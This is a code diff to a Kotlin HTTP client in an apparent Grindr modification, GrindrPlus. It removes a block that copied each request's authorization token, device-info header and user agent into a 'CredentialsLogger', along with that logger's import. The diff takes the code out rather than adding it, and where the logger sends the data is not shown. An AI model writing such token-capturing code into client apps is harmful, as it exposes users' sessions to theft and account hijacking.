@@ -4,13 +4,11 @@ import android.content.ContentValues
 import android.widget.Toast
 import com.grindrplus.GrindrPlus
 import com.grindrplus.GrindrPlus.showToast
-import com.grindrplus.core.CredentialsLogger
 import com.grindrplus.core.DatabaseHelper
 import com.grindrplus.core.Logger
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import okhttp3.*
-import com.grindrplus.core.http.Interceptor
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 
@@ -19,10 +17,6 @@ class Client(interceptor: Interceptor) {
         .addInterceptor(interceptor)
         .build()
 
-
-    // Hardcoded version string
-   // private val hardcodedUserAgent = "grindr3/25.16.0.144399;144399;Free;Android 15;SM-A166P;samsung"
-    //
     fun sendRequest(
         url: String,
         method: String = "GET",
@@ -32,16 +26,6 @@ class Client(interceptor: Interceptor) {
         val requestBuilder = Request.Builder().url(url)
         headers?.forEach { (key, value) ->
             requestBuilder.addHeader(key, value)
-
-            // Extract auth token and device info for CredentialsLogger before making the request
-            val authToken = headers?.get("Authorization") ?: headers?.get("authorization")
-            val lDeviceInfo = headers?.get("l-device-info") ?: headers?.get("L-Device-Info")
-            val userAgentString = headers?.get("User-Agent") ?: headers?.get("userAgentString")
-            // Log credentials if we have an auth token
-            if (authToken != null) {
-                //CredentialsLogger.log(authToken, lDeviceInfo, GrindrPlus.hardcodedUserAgent)
-                CredentialsLogger.log(authToken, lDeviceInfo, userAgentString)
-            }
         }
 
         when (method.uppercase()) {
